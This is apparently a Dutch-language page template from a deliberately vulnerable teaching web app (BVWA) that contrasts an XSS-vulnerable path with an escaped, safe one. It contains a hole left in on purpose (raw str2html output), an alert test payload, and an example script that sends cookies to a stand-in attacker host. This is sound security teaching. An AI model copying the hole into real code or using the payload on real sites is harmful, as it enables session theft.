<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{.Title}} - BVWA</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: Arial, sans-serif; background: #f0f2f5; }

        header {
            background: #2c3e50;
            color: white;
            padding: 16px 30px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        header .logo {
            font-size: 22px;
            font-weight: bold;
            text-decoration: none;
            color: white;
        }
        header .logo span { color: #e67e22; }
        header nav a {
            color: #ecf0f1;
            text-decoration: none;
            margin-left: 20px;
            font-size: 14px;
        }
        header nav a:hover { color: #e67e22; }

        .breadcrumb {
            background: #34495e;
            padding: 8px 30px;
            font-size: 13px;
            color: #bdc3c7;
        }
        .breadcrumb a { color: #e67e22; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }

        .container {
            max-width: 960px;
            margin: 30px auto;
            padding: 0 20px;
        }

        .module-header {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 20px;
        }
        .badge {
            background: #e67e22;
            color: white;
            font-weight: bold;
            font-size: 13px;
            padding: 6px 14px;
            border-radius: 20px;
            white-space: nowrap;
        }
        .module-header h1 { font-size: 24px; color: #2c3e50; }
        .btn-info {
            margin-left: auto;
            background: #3498db;
            color: white;
            border: none;
            padding: 9px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            white-space: nowrap;
        }
        .btn-info:hover { background: #2980b9; }

        .sub-nav {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .sub-nav a {
            padding: 8px 18px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 13px;
            font-weight: bold;
            border: 2px solid #ddd;
            color: #555;
            background: white;
        }
        .sub-nav a:hover { border-color: #3498db; color: #3498db; }
        .sub-nav a.active-vuln {
            background: #e74c3c;
            border-color: #e74c3c;
            color: white;
        }
        .sub-nav a.active-safe {
            background: #27ae60;
            border-color: #27ae60;
            color: white;
        }

        .cards {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        @media (max-width: 640px) {
            .cards { grid-template-columns: 1fr; }
        }

        .card {
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }
        .card-header {
            padding: 14px 20px;
            font-weight: bold;
            font-size: 15px;
            color: white;
        }
        .card-header.vuln { background: #e74c3c; }
        .card-header.safe { background: #27ae60; }
        .card-body { padding: 20px; }
        .card-body p {
            font-size: 14px;
            color: #555;
            line-height: 1.6;
            margin-bottom: 14px;
        }

        .input-group { margin-bottom: 14px; }
        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: bold;
            color: #555;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 9px 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 13px;
        }
        .input-group input:focus {
            outline: none;
            border-color: #3498db;
        }

        .code-block {
            background: #1e1e1e;
            color: #d4d4d4;
            font-family: monospace;
            font-size: 12px;
            padding: 14px;
            border-radius: 6px;
            overflow-x: auto;
            margin: 10px 0;
            line-height: 1.6;
        }
        .ckw  { color: #569cd6; }
        .cstr { color: #ce9178; }
        .ccmt { color: #6a9955; }

        .btn-submit {
            display: block;
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-submit.red   { background: #e74c3c; }
        .btn-submit.red:hover   { background: #c0392b; }
        .btn-submit.green { background: #27ae60; }
        .btn-submit.green:hover { background: #1e8449; }

        .output-box {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin-top: 24px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }
        .output-box h3 { margin-bottom: 12px; color: #2c3e50; }

        .tag-vuln {
            display: inline-block;
            background: #fdecea;
            color: #e74c3c;
            font-weight: bold;
            font-size: 12px;
            padding: 3px 10px;
            border-radius: 20px;
            margin-bottom: 10px;
        }
        .tag-safe {
            display: inline-block;
            background: #eafaf1;
            color: #27ae60;
            font-weight: bold;
            font-size: 12px;
            padding: 3px 10px;
            border-radius: 20px;
            margin-bottom: 10px;
        }

        .xss-output-vuln {
            background: #fff3f3;
            border: 2px solid #e74c3c;
            border-radius: 6px;
            padding: 14px;
            min-height: 50px;
            font-size: 14px;
            margin: 10px 0;
        }
        .xss-output-safe {
            background: #f3fff3;
            border: 2px solid #27ae60;
            border-radius: 6px;
            padding: 14px;
            min-height: 50px;
            font-size: 14px;
            font-family: monospace;
            margin: 10px 0;
            word-break: break-all;
        }
        .tip {
            background: #eaf4fb;
            border: 1px solid #aed6f1;
            border-radius: 6px;
            padding: 12px 16px;
            font-size: 13px;
            color: #2471a3;
            margin-top: 12px;
        }

        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.55);
            z-index: 9999;
            overflow-y: auto;
            padding: 40px 20px;
        }
        .modal {
            background: white;
            border-radius: 10px;
            max-width: 720px;
            width: 100%;
            margin: 0 auto;
            padding: 30px;
            position: relative;
            box-shadow: 0 8px 40px rgba(0,0,0,0.3);
        }
        .modal-close {
            position: absolute;
            top: 14px; right: 18px;
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #666;
            line-height: 1;
        }
        .modal-close:hover { color: #e74c3c; }
        .modal h2 {
            color: #2c3e50;
            margin-bottom: 6px;
            font-size: 20px;
            padding-right: 30px;
        }
        .modal .subtitle {
            color: #7f8c8d;
            font-size: 13px;
            margin-bottom: 20px;
        }
        .modal hr {
            border: none;
            border-top: 1px solid #ecf0f1;
            margin: 16px 0;
        }
        .cwe-list {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin: 10px 0 16px;
        }
        .cwe-tag {
            background: #eaf4fb;
            border: 1px solid #aed6f1;
            color: #2471a3;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .info-section { margin-bottom: 16px; }
        .info-section h3 {
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: #7f8c8d;
            margin-bottom: 8px;
        }
        .info-section p {
            font-size: 14px;
            line-height: 1.7;
            color: #444;
        }
        .vuln-box {
            background: #fdf2f2;
            border-left: 4px solid #e74c3c;
            padding: 12px 16px;
            border-radius: 0 6px 6px 0;
            font-size: 14px;
            line-height: 1.7;
            color: #444;
        }
        .safe-box {
            background: #f2fdf5;
            border-left: 4px solid #2ecc71;
            padding: 12px 16px;
            border-radius: 0 6px 6px 0;
            font-size: 14px;
            line-height: 1.7;
            color: #444;
        }
        .vuln-box ul, .safe-box ul { margin: 8px 0 0 20px; }
        .vuln-box li, .safe-box li { margin-bottom: 5px; }

        footer {
            text-align: center;
            padding: 20px;
            color: #aaa;
            font-size: 12px;
            margin-top: 40px;
        }
    </style>
</head>
<body>

<!-- HEADER -->
<header>
    <a href="/" class="logo">&#x1F510; <span>BVWA</span></a>
    <nav>
        <a href="/">&#x1F3E0; Home</a>
        <a href="/injection/sql/vulnerable">SQL Kwetsbaar</a>
        <a href="/injection/sql/secure">SQL Veilig</a>
        <a href="/injection/xss/vulnerable">XSS Kwetsbaar</a>
        <a href="/injection/xss/secure">XSS Veilig</a>
    </nav>
</header>

<!-- BREADCRUMB -->
<div class="breadcrumb">
    <a href="/">Home</a> &rsaquo; A05 &rsaquo; XSS Injection &rsaquo; {{.Title}}
</div>

<!-- MAIN -->
<div class="container">

    <div class="module-header">
        <span class="badge">A05</span>
        <h1>Injection — XSS</h1>
        <button type="button" class="btn-info" id="openInfoBtn">
            Info &amp; CWEs
        </button>
    </div>

    <!-- Sub-navigation -->
    <div class="sub-nav">
        <a href="/injection/sql/vulnerable">SQL Kwetsbaar</a>
        <a href="/injection/sql/secure">SQL Veilig</a>
        <a href="/injection/xss/vulnerable"
           {{if eq .Title "XSS Injection (Kwetsbaar)"}}class="active-vuln"{{end}}>
            XSS Kwetsbaar
        </a>
        <a href="/injection/xss/secure"
           {{if eq .Title "XSS Injection (Veilig)"}}class="active-safe"{{end}}>
            XSS Veilig
        </a>
    </div>

    <!-- Cards -->
    <div class="cards">

        <!-- KWETSBAAR -->
        <div class="card">
            <div class="card-header vuln">Kwetsbare versie</div>
            <div class="card-body">
                <p>
                    Input wordt <strong>als raw HTML</strong>
                    in de pagina gezet. Een aanvaller kan
                    JavaScript injecteren dat in de browser
                    van het slachtoffer wordt uitgevoerd.
                </p>

                <div class="code-block">
<span class="ccmt">// KWETSBAAR: raw HTML output</span>
<span class="ccmt">// In template: {{"{{"}}str2html .RawInput{{"}}"}}</span>
<span class="ccmt">// Input wordt NIET geescaped!</span>
                </div>

                <p style="font-size:13px; color:#e74c3c; font-weight:bold;">
                    Probeer: &lt;script&gt;alert('XSS')&lt;/script&gt;
                </p>

                <form method="GET" action="/injection/xss/vulnerable">
                    <div class="input-group">
                        <label>Input (wordt als HTML gerenderd):</label>
                        <input type="text" name="input"
                               placeholder="&lt;script&gt;alert('XSS')&lt;/script&gt;">
                    </div>
                    <button type="submit"
                            class="btn-submit red">
                        Versturen (kwetsbaar)
                    </button>
                </form>
            </div>
        </div>

        <!-- VEILIG -->
        <div class="card">
            <div class="card-header safe">Veilige versie</div>
            <div class="card-body">
                <p>
                    Input wordt <strong>automatisch geescaped</strong>
                    door Beego's template engine.
                    <code>&lt;script&gt;</code> wordt omgezet naar
                    <code>&amp;lt;script&amp;gt;</code>.
                </p>

                <div class="code-block">
<span class="ccmt">// VEILIG: Beego escapet automatisch</span>
<span class="ccmt">// In template: {{"{{"}} .SafeInput {{"}}"}}</span>
<span class="ccmt">// Beego converteert &lt; naar &amp;lt;</span>
                </div>

                <p style="font-size:13px; color:#27ae60; font-weight:bold;">
                    Script-tags worden als tekst weergegeven.
                </p>

                <form method="GET" action="/injection/xss/secure">
                    <div class="input-group">
                        <label>Input (wordt geescaped):</label>
                        <input type="text" name="input"
                               placeholder="&lt;script&gt;alert('XSS')&lt;/script&gt;">
                    </div>
                    <button type="submit"
                            class="btn-submit green">
                        Versturen (veilig)
                    </button>
                </form>
            </div>
        </div>

    </div>

    <!-- Output box -->
    <div class="output-box">
        <h3>Output voor: <strong>{{.Title}}</strong></h3>

        {{if eq .Title "XSS Injection (Kwetsbaar)"}}
        <span class="tag-vuln">KWETSBAAR</span>
        <p>Input wordt als <strong>raw HTML</strong> gerenderd:</p>
        <div class="xss-output-vuln">
            {{if .RawInput}}
            {{str2html .RawInput}}
            {{else}}
            <em style="color:#aaa;">
                Voer input in om XSS te demonstreren.
            </em>
            {{end}}
        </div>
        <p style="color:#e74c3c; font-size:13px;">
            Script-tags worden uitgevoerd! Inspecteer de
            page source om het verschil te zien.
        </p>
        {{else}}
        <span class="tag-safe">VEILIG</span>
        <p>Input wordt als <strong>veilige tekst</strong> getoond:</p>
        <div class="xss-output-safe">
            {{if .SafeInput}}
            {{.SafeInput}}
            {{else}}
            <em style="color:#aaa;">
                Voer input in om de escaping te zien.
            </em>
            {{end}}
        </div>
        <p style="color:#27ae60; font-size:13px;">
            Script-tags zijn geescaped en worden als tekst
            getoond, niet uitgevoerd.
        </p>
        {{end}}

        <div class="tip">
            Tip: Bekijk de paginabron (Ctrl+U) om het verschil
            te zien tussen de kwetsbare (raw HTML) en veilige
            (geescapede tekst) versie.
        </div>
    </div>

</div>

<!-- INFO MODAL -->
<div class="modal-overlay" id="infoModal">
    <div class="modal">
        <button type="button" class="modal-close" id="closeInfoBtn">X</button>

        <h2>A05:2025 - Injection (XSS)</h2>
        <p class="subtitle">
            OWASP Top 10:2025 - Positie #5 - Cross-Site Scripting
        </p>
        <hr>

        <div class="info-section">
            <h3>Wat is het?</h3>
            <p>
                Cross-Site Scripting (XSS) treedt op wanneer een
                applicatie onbetrouwbare data in een webpagina
                opneemt zonder correcte validatie of escaping.
                Een aanvaller kan scripts injecteren die worden
                uitgevoerd in de browser van het slachtoffer,
                wat kan leiden tot sessiediefstal, phishing of
                malware-verspreiding.
            </p>
        </div>
        <hr>

        <div class="info-section">
            <h3>Gerelateerde CWEs</h3>
            <div class="cwe-list">
                <span class="cwe-tag">CWE-79 Cross-site Scripting (XSS)</span>
                <span class="cwe-tag">CWE-80 Basic XSS</span>
                <span class="cwe-tag">CWE-81 Improper Neutralization of Script in Error</span>
                <span class="cwe-tag">CWE-82 XSS via IMG Tags</span>
                <span class="cwe-tag">CWE-83 XSS in Attributes</span>
                <span class="cwe-tag">CWE-84 XSS via Unicode Encoding</span>
                <span class="cwe-tag">CWE-85 Doubled Character XSS</span>
                <span class="cwe-tag">CWE-86 XSS in Alternate Encoding</span>
                <span class="cwe-tag">CWE-87 XSS in Script Syntax</span>
                <span class="cwe-tag">CWE-20 Improper Input Validation</span>
                <span class="cwe-tag">CWE-116 Improper Encoding/Escaping of Output</span>
                <span class="cwe-tag">CWE-184 Incomplete List of Disallowed Inputs</span>
                <span class="cwe-tag">CWE-693 Protection Mechanism Failure</span>
            </div>
        </div>
        <hr>

        <div class="info-section">
            <h3>Waarom is de kwetsbare versie onveilig?</h3>
            <div class="vuln-box">
                De kwetsbare versie gebruikt
                <strong>str2html</strong> — raw HTML output
                (CWE-79):
                <ul>
                    <li><strong>Script executie:</strong>
                        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                        wordt uitgevoerd in de browser</li>
                    <li><strong>Cookie diefstal:</strong>
                        <code>&lt;script&gt;document.location='http://aanvaller.nl/steal?c='+document.cookie&lt;/script&gt;</code></li>
                    <li><strong>Keylogging:</strong> aanvaller
                        kan alle toetsaanslagen opnemen</li>
                    <li><strong>Phishing:</strong> de pagina
                        kan volledig worden overschreven</li>
                    <li><strong>Malware:</strong> drive-by
                        downloads via script injection</li>
                </ul>
            </div>
        </div>
        <hr>

        <div class="info-section">
            <h3>Waarom is de veilige versie correct?</h3>
            <div class="safe-box">
                De veilige versie gebruikt
                <strong>automatische escaping</strong>
                van Beego:
                <ul>
                    <li><strong>HTML entities:</strong>
                        <code>&lt;</code> wordt
                        <code>&amp;lt;</code>,
                        <code>&gt;</code> wordt
                        <code>&amp;gt;</code></li>
                    <li><strong>Scripts geblokkeerd:</strong>
                        script-tags worden als tekst
                        weergegeven, niet uitgevoerd</li>
                    <li><strong>Beego default:</strong>
                        <code>{{"{{"}} .Variable {{"}}"}}</code> escapet
                        automatisch — altijd veilig</li>
                    <li><strong>str2html bewust vermijden:</strong>
                        gebruik alleen als de bron 100%
                        vertrouwd is</li>
                    <li><strong>CSP als extra laag:</strong>
                        Content-Security-Policy header
                        blokkeert inline scripts</li>
                </ul>
            </div>
        </div>
        <hr>

        <div class="info-section">
            <h3>Mitigatie</h3>
            <p>
                Gebruik altijd context-aware output encoding.
                Valideer input server-side. Implementeer een
                strikte Content-Security-Policy. Gebruik
                HTTPOnly en Secure cookies. Vermijd
                str2html/innerHTML tenzij absoluut noodzakelijk
                met vertrouwde bronnen.
            </p>
        </div>

    </div>
</div>

<footer>
    BVWA is uitsluitend bedoeld voor educatieve doeleinden -
    gebruik alleen in een geisoleerde testomgeving.
</footer>

<script type="text/javascript">
window.onload = function() {
    var modal    = document.getElementById('infoModal');
    var openBtn  = document.getElementById('openInfoBtn');
    var closeBtn = document.getElementById('closeInfoBtn');

    if (!modal || !openBtn || !closeBtn) { return; }

    openBtn.onclick = function() {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
    };
    closeBtn.onclick = function() {
        modal.style.display = 'none';
        document.body.style.overflow = '';
    };
    modal.onclick = function(e) {
        if (e.target === modal) {
            modal.style.display = 'none';
            document.body.style.overflow = '';
        }
    };
    document.onkeydown = function(e) {
        if (e.key === 'Escape') {
            modal.style.display = 'none';
            document.body.style.overflow = '';
        }
    };
};
</script>

</body>
</html>
